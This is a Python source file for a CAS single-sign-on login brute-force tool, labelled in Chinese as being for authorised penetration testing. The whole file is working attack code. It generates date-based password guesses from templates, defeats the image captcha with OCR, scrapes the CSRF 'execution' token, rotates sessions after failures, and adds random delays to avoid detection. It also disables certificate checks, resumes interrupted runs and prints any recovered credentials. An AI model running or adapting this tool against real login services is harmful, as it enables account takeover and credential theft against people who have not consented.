"""
CAS登录暴力破解测试工具
用途：授权的安全渗透测试
注意：使用前请确保已获得书面授权

按功能划分模块：
- Config: 配置管理
- StateManager: 状态管理
- create_session: 会话管理
- get_and_recognize_captcha: 验证码处理
- check_response: 响应检测
- extract_execution: 页面解析
- submit_login: 登录提交
- adaptive_delay: 延迟控制
- generate_report: 报告生成
- main: 主逻辑
"""

import requests
import ddddocr
from lxml import etree
import generate_captcha_url as gcu
import time
import json
import os
import random
import sys
from datetime import datetime
from requests.exceptions import ConnectionError, Timeout, SSLError


# ==================== 配置区域 ====================
class Config:
    """系统配置常量"""
    LOGIN_URL = "https://www.example.com/login"
    RESULTS_FILE = os.path.join(os.getcwd(), 'brute_results.json')

    # 请求配置
    REQUEST_TIMEOUT = 15
    VERIFY_SSL = False

    # 延迟配置（秒）
    DELAY_BASE = 3
    DELAY_JITTER = 2

    # OCR配置
    CAPTCHA_MIN_LENGTH = 3
    CAPTCHA_MAX_LENGTH = 5

    # OCR重试配置
    OCR_MAX_RETRIES = 2

    # 用户数据格式：(用户名, 密码模板)
    # 密码模板中的 {} 会被替换为日期（01-31）
    USERS_DATA = [
        ("12345678", "{}1235@ie"),
        ("12345678", "{}99999@zie"),
    ]


# ==================== 会话管理 ====================
def create_session():
    """创建并配置requests会话"""
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.9',
    })
    return session


# 初始化全局session
session = create_session()


# ==================== 状态管理 ====================
class StateManager:
    """测试结果状态管理器"""

    def __init__(self, state_file):
        self.state_file = state_file
        self.results = self._load_state()

    def _load_state(self):
        """加载之前的测试状态"""
        default_state = {
            "success": [],
            "attempts": 0,
            "password_fails": 0,
            "captcha_fails": 0,
            "errors": [],
            "last_user_idx": 0,
            "last_day": 1,
            "start_time": datetime.now().isoformat()
        }

        try:
            with open(self.state_file, 'r', encoding='utf-8') as f:
                state = json.load(f)
                print(f"[INFO] 恢复测试进度: user_idx={state['last_user_idx']}, day={state['last_day']}")
                return state
        except (FileNotFoundError, json.JSONDecodeError):
            print("[INFO] 开始新的测试")
            return default_state

    def save(self):
        """保存测试结果到文件（原子操作）"""
        temp_file = self.state_file + '.tmp'
        try:
            with open(temp_file, 'w', encoding='utf-8') as f:
                json.dump(self.results, f, ensure_ascii=False, indent=2)
            os.replace(temp_file, self.state_file)
        except Exception as e:
            print(f"[ERROR] 保存失败: {e}")

    def increment_attempts(self):
        """增加尝试次数"""
        self.results['attempts'] += 1
        return self.results['attempts']

    def record_success(self, username, password, redirect_url):
        """记录成功的凭据"""
        self.results['success'].append({
            'username': username,
            'password': password,
            'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'redirect': redirect_url
        })

    def record_password_fail(self):
        """记录密码错误"""
        self.results['password_fails'] += 1

    def record_captcha_fail(self):
        """记录验证码错误"""
        self.results['captcha_fails'] += 1

    def record_error(self, error_type, error_msg):
        """记录错误"""
        self.results['errors'].append({
            'type': error_type,
            'msg': str(error_msg)[:100],
            'time': datetime.now().strftime('%H:%M:%S')
        })

    def update_progress(self, user_idx, day):
        """更新进度"""
        self.results['last_user_idx'] = user_idx
        self.results['last_day'] = day + 1 if day < 31 else 1

    def get_stats(self):
        """获取统计信息"""
        return {
            'total_attempts': self.results['attempts'],
            'success_count': len(self.results['success']),
            'password_fails': self.results['password_fails'],
            'captcha_fails': self.results['captcha_fails'],
            'errors': len(self.results['errors'])
        }


# ==================== 验证码处理 ====================
def get_and_recognize_captcha(sess):
    """
    获取验证码并识别

    关键点：
    - 每次都生成新的 captchaKey（因为上次提交后已失效）
    - 只进行一次OCR识别
    - 返回 (captcha_text, captcha_key)

    Args:
        sess: requests会话对象

    Returns:
        tuple: (验证码文本, 验证码key)，失败返回 ("", key)
    """
    try:
        # 记录开始时间（用于验证实效性）
        start_time = time.time()

        # 1. 生成新的 captchaKey（模拟JS执行）
        url, captcha_key = gcu.generate_captcha_url()

        # 2. 请求验证码图片
        img_resp = sess.get(url, verify=False, timeout=10)
        img_resp.raise_for_status()

        # 3. OCR识别（单次识别）
        ocr = ddddocr.DdddOcr()
        captcha_text = ocr.classification(img_resp.content).strip()

        # 计算耗时
        elapsed = time.time() - start_time

        # 4. 验证识别结果格式
        if (captcha_text and
            captcha_text.isdigit() and
            Config.CAPTCHA_MIN_LENGTH < len(captcha_text) < Config.CAPTCHA_MAX_LENGTH):
            print(f"     [CAPTCHA] 识别成功: {captcha_text} (耗时: {elapsed:.2f}s)")
            return captcha_text, captcha_key
        else:
            print(f"     [CAPTCHA] 识别失败: '{captcha_text}' (长度: {len(captcha_text) if captcha_text else 0})")
            return "", captcha_key

    except Exception as e:
        print(f"[CAPTCHA_ERROR] {str(e)[:50]}")
        return "", ""


# ==================== 响应检测 ====================
def check_response(resp):
    """
    完善的响应检测

    根据网页源码的实际文案进行多维度检测

    Args:
        resp: requests响应对象

    Returns:
        str: 检测结果类型
            - 'success': 登录成功
            - 'password_error': 密码错误
            - 'captcha_error': 验证码错误
            - 'locked': 账户锁定
            - 'user_not_found': 用户不存在
            - 'redirect_fail': 重定向失败
            - 'unknown': 未知状态
    """
    # 1. 检查重定向
    if resp.status_code in [302, 301, 303, 307, 308]:
        location = resp.headers.get('Location', '').lower()
        # 排除重定向到错误页面的情况
        if 'error' not in location and 'fail' not in location:
            set_cookie = resp.headers.get('Set-Cookie', '')
            if 'JSESSIONID' in set_cookie or 'CASTGC' in set_cookie:
                return 'success'
        return 'redirect_fail'

    response_text = resp.text

    # 2. 尝试解析JSON响应
    try:
        resp_json = resp.json()
        if resp_json.get('code') == 200 or resp_json.get('success') == True:
            return 'success'
    except:
        pass

    # 3. HTML文本检测（基于实际网页文案）
    text_lower = response_text.lower()

    if '密码错误' in text_lower or '密码不正确' in text_lower:
        return 'password_error'

    if '验证码错误' in text_lower or '验证码不正确' in text_lower:
        return 'captcha_error'

    if '锁定' in text_lower or '禁用' in text_lower or '冻结' in text_lower:
        return 'locked'

    if '用户不存在' in text_lower or '账号不存在' in text_lower:
        return 'user_not_found'

    if '成功' in text_lower and ('登录' in text_lower or '认证' in text_lower):
        return 'success'

    # 4. 检查是否有Ticket或Token（成功标志）
    if 'ticket=' in response_text or 'token=' in response_text:
        return 'success'

    return 'unknown'


# ==================== 页面解析 ====================
def extract_execution(html_text):
    """
    从HTML中提取execution字段

    Args:
        html_text: 登录页面HTML文本

    Returns:
        str: execution值，失败返回None
    """
    try:
        html = etree.HTML(html_text)
        execution_list = html.xpath('//input[@name="execution"]/@value')
        if execution_list:
            return execution_list[0]
        return None
    except Exception as e:
        print(f"[PARSE_ERROR] execution提取失败: {str(e)[:50]}")
        return None


# ==================== 登录提交 ====================
def submit_login(sess, username, password, captcha_text, captcha_key, execution):
    """
    提交登录请求

    Args:
        sess: requests会话对象
        username: 用户名
        password: 密码
        captcha_text: 验证码文本
        captcha_key: 验证码key
        execution: CSRF令牌

    Returns:
        tuple: (result_type, response_object)
    """
    # 构造完整的登录数据
    login_data = {
        'username': username,
        'password': password,
        'captcha': captcha_text,
        'execution': execution,
        '_eventId': 'submit',
        'captchaKey': captcha_key,
        'geolocation': '',
        'submit': '登录',
    }

    # 添加Referer等请求头
    headers = {
        'Referer': Config.LOGIN_URL,
        'Origin': 'https://www.example.com',
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    # 提交登录
    resp = sess.post(
        Config.LOGIN_URL,
        data=login_data,
        headers=headers,
        verify=False,
        allow_redirects=False,
        timeout=Config.REQUEST_TIMEOUT
    )

    result = check_response(resp)
    return result, resp


# ==================== 延迟控制 ====================
def adaptive_delay():
    """
    固定延迟 + 随机抖动

    延迟范围：Config.DELAY_BASE ~ (Config.DELAY_BASE + Config.DELAY_JITTER) 秒
    """
    delay = Config.DELAY_BASE + random.uniform(0, Config.DELAY_JITTER)
    time.sleep(delay)
    return delay


# ==================== 报告生成 ====================
def generate_report(state_manager):
    """
    生成最终测试报告

    Args:
        state_manager: 状态管理器实例
    """
    stats = state_manager.get_stats()

    print(f"\n{'='*60}")
    print(f"CAS登录暴力破解测试报告")
    print(f"{'='*60}")
    print(f"测试时间: {state_manager.results.get('start_time', 'N/A')}")
    print(f"结束时间: {datetime.now().isoformat()}")
    print(f"\n统计信息:")
    print(f"  总尝试次数: {stats['total_attempts']}")
    print(f"  成功数量: {stats['success_count']}")
    print(f"  密码错误: {stats['password_fails']}")
    print(f"  验证码失败: {stats['captcha_fails']}")
    print(f"  其他错误: {stats['errors']}")

    if state_manager.results['success']:
        print(f"\n成功的凭据:")
        for item in state_manager.results['success']:
            print(f"  ✓ 用户: {item['username']}, 密码: {item['password']}, 时间: {item['time']}")

    if state_manager.results['errors']:
        print(f"\n最近的错误:")
        for error in state_manager.results['errors'][-5:]:  # 显示最近5个错误
            print(f"  ✗ [{error['type']}] {error['msg']} at {error['time']}")

    print(f"{'='*60}")


# ==================== 主逻辑 ====================
def main():
    """主函数"""
    # 使用全局session
    global session

    # 初始化状态管理器
    state_mgr = StateManager(Config.RESULTS_FILE)

    print("="*60)
    print("CAS登录暴力破解测试工具 v2.0")
    print(f"目标: {Config.LOGIN_URL}")
    print(f"用户数: {len(Config.USERS_DATA)}, 每人最多31次尝试")
    print("="*60)

    users_data = Config.USERS_DATA

    try:
        # 遍历所有用户
        for user_idx in range(state_mgr.results['last_user_idx'], len(users_data)):
            username, pwd_template = users_data[user_idx]
            day_start = state_mgr.results['last_day'] if user_idx == state_mgr.results['last_user_idx'] else 1

            print(f"\n[USER] 开始测试用户: {username} ({user_idx+1}/{len(users_data)})")

            # 遍历日期（01-31）
            for day in range(day_start, 32):
                day_str = f"{day:02d}"
                password = pwd_template.format(day_str)

                attempt_num = state_mgr.increment_attempts()

                # 显示进度
                progress = f"[{attempt_num}] D{day_str} {password}"
                print(f"  {progress:<25}", end="", flush=True)

                try:
                    # 1. 获取登录页面（获取 execution）
                    resp = session.get(
                        Config.LOGIN_URL,
                        verify=False,
                        timeout=Config.REQUEST_TIMEOUT
                    )

                    # 提取 execution
                    execution = extract_execution(resp.text)
                    if not execution:
                        print("❌ NO_EXECUTION")
                        time.sleep(2)
                        continue

                    # 2. 获取并识别验证码
                    captcha_text, captcha_key = get_and_recognize_captcha(session)

                    if not captcha_text:
                        print("❌ OCR_FAIL (重新获取)")
                        state_mgr.record_captcha_fail()

                        # 重新获取页面和验证码（最多重试Config.OCR_MAX_RETRIES次）
                        retry_success = False
                        for retry in range(Config.OCR_MAX_RETRIES):
                            print(f"     [RETRY {retry+1}/{Config.OCR_MAX_RETRIES}] 重新获取页面和验证码...")

                            # 重新获取页面
                            resp = session.get(
                                Config.LOGIN_URL,
                                verify=False,
                                timeout=Config.REQUEST_TIMEOUT
                            )

                            execution = extract_execution(resp.text)
                            if not execution:
                                print(f"     [RETRY] NO_EXECUTION")
                                time.sleep(2)
                                continue

                            # 重新获取验证码
                            captcha_text, captcha_key = get_and_recognize_captcha(session)

                            if captcha_text:
                                print(f"     [RETRY] OCR成功: {captcha_text}")
                                retry_success = True
                                break
                            else:
                                print(f"     [RETRY] OCR仍失败")
                                state_mgr.record_captcha_fail()

                        # 如果重试后仍然失败，跳过本次
                        if not retry_success:
                            print("❌ OCR最终失败，跳过本次")
                            continue

                    # 3. 提交登录
                    result, resp_post = submit_login(
                        session,
                        username,
                        password,
                        captcha_text,
                        captcha_key,
                        execution
                    )

                    # 4. 处理结果
                    if result == 'success':
                        print("✅ SUCCESS!")
                        state_mgr.record_success(
                            username,
                            password,
                            resp_post.headers.get('Location', '')
                        )
                        break  # 成功则跳出日期循环

                    elif result == 'password_error':
                        print("❌ WRONG_PWD")
                        state_mgr.record_password_fail()

                    elif result == 'captcha_error':
                        print("❌ CAPTCHA_ERR (重新获取session和验证码)")
                        state_mgr.record_captcha_fail()

                        # 验证码错误时，重新获取session并重新识别验证码后重试
                        retry_success = False
                        for retry in range(Config.OCR_MAX_RETRIES):
                            print(f"     [RETRY_CAPTCHA {retry+1}/{Config.OCR_MAX_RETRIES}] 重新创建session并获取验证码...")

                            try:
                                # 1. 重新创建session（清除旧cookie）
                                session = create_session()

                                # 2. 重新获取登录页面
                                resp = session.get(
                                    Config.LOGIN_URL,
                                    verify=False,
                                    timeout=Config.REQUEST_TIMEOUT
                                )

                                # 3. 提取新的execution
                                execution = extract_execution(resp.text)
                                if not execution:
                                    print(f"     [RETRY_CAPTCHA] NO_EXECUTION")
                                    time.sleep(2)
                                    continue

                                # 4. 重新获取并识别验证码
                                captcha_text, captcha_key = get_and_recognize_captcha(session)

                                if not captcha_text:
                                    print(f"     [RETRY_CAPTCHA] OCR失败")
                                    state_mgr.record_captcha_fail()
                                    continue

                                # 5. 使用新session和新验证码重新提交
                                result, resp_post = submit_login(
                                    session,
                                    username,
                                    password,
                                    captcha_text,
                                    captcha_key,
                                    execution
                                )

                                # 6. 检查重试结果
                                if result == 'success':
                                    print("✅ SUCCESS! (重试成功)")
                                    state_mgr.record_success(
                                        username,
                                        password,
                                        resp_post.headers.get('Location', '')
                                    )
                                    retry_success = True
                                    break
                                elif result == 'captcha_error':
                                    print(f"     [RETRY_CAPTCHA] 验证码仍然错误")
                                    state_mgr.record_captcha_fail()
                                    # 继续下一次重试
                                else:
                                    # 其他结果（密码错误、锁定等），跳出重试循环
                                    print(f"     [RETRY_CAPTCHA] 状态变更为: {result}")
                                    break

                            except Exception as e:
                                print(f"     [RETRY_CAPTCHA] 异常: {str(e)[:40]}")
                                state_mgr.record_error('retry_captcha', str(e)[:80])

                        # 如果重试成功，跳出主循环
                        if retry_success:
                            break

                        # 如果重试后仍然是验证码错误或其他非成功状态，继续下一天
                        if result != 'success':
                            continue

                    elif result == 'locked':
                        print("🔒 LOCKED!")
                        break  # 账户锁定，跳出

                    elif result == 'user_not_found':
                        print("🚫 NO_USER")
                        break  # 用户不存在，跳出

                    elif result == 'redirect_fail':
                        print("⚠️ REDIRECT_FAIL (重新获取session和验证码)")

                        # 重定向失败时，重新获取session并重新识别验证码后重试
                        retry_success = False
                        for retry in range(Config.OCR_MAX_RETRIES):
                            print(f"     [RETRY_REDIRECT {retry+1}/{Config.OCR_MAX_RETRIES}] 重新创建session并获取验证码...")

                            try:
                                # 1. 重新创建session（清除旧cookie）
                                session = create_session()

                                # 2. 重新获取登录页面
                                resp = session.get(
                                    Config.LOGIN_URL,
                                    verify=False,
                                    timeout=Config.REQUEST_TIMEOUT
                                )

                                # 3. 提取新的execution
                                execution = extract_execution(resp.text)
                                if not execution:
                                    print(f"     [RETRY_REDIRECT] NO_EXECUTION")
                                    time.sleep(2)
                                    continue

                                # 4. 重新获取并识别验证码
                                captcha_text, captcha_key = get_and_recognize_captcha(session)

                                if not captcha_text:
                                    print(f"     [RETRY_REDIRECT] OCR失败")
                                    state_mgr.record_captcha_fail()
                                    continue

                                # 5. 使用新session和新验证码重新提交
                                result, resp_post = submit_login(
                                    session,
                                    username,
                                    password,
                                    captcha_text,
                                    captcha_key,
                                    execution
                                )

                                # 6. 检查重试结果
                                if result == 'success':
                                    print("✅ SUCCESS! (重试成功)")
                                    state_mgr.record_success(
                                        username,
                                        password,
                                        resp_post.headers.get('Location', '')
                                    )
                                    retry_success = True
                                    break
                                elif result == 'redirect_fail':
                                    print(f"     [RETRY_REDIRECT] 重定向仍然失败")
                                    # 继续下一次重试
                                else:
                                    # 其他结果，跳出重试循环
                                    print(f"     [RETRY_REDIRECT] 状态变更为: {result}")
                                    break

                            except Exception as e:
                                print(f"     [RETRY_REDIRECT] 异常: {str(e)[:40]}")
                                state_mgr.record_error('retry_redirect', str(e)[:80])

                        # 如果重试成功，跳出主循环
                        if retry_success:
                            break

                        # 如果重试后仍然失败，继续下一天
                        if result != 'success':
                            continue

                    else:
                        print(f"❓ UNKNOWN(s={resp_post.status_code})")

                except Timeout:
                    print("⏱️ TIMEOUT")
                    state_mgr.record_error('timeout', 'Request timeout')
                    time.sleep(10)

                except ConnectionError as e:
                    print("🔌 CONN_ERR")
                    state_mgr.record_error('connection', str(e)[:80])
                    time.sleep(5)

                except SSLError as e:
                    print("🔐 SSL_ERR")
                    state_mgr.record_error('ssl', str(e)[:80])

                except KeyboardInterrupt:
                    print("\n\n[INFO] 用户中断测试")
                    generate_report(state_mgr)
                    sys.exit(0)

                except Exception as e:
                    print(f"💥 ERR:{str(e)[:30]}")
                    state_mgr.record_error('unknown', str(e))

                # 保存进度
                state_mgr.update_progress(user_idx, day)
                state_mgr.save()

                # 延迟
                delay = adaptive_delay()
                print(f"     [DELAY] {delay:.2f}s")

    except Exception as e:
        print(f"\n[FATAL ERROR] {str(e)}")
        state_mgr.record_error('fatal', str(e))

    finally:
        # 生成最终报告
        generate_report(state_mgr)


if __name__ == '__main__':
    main()
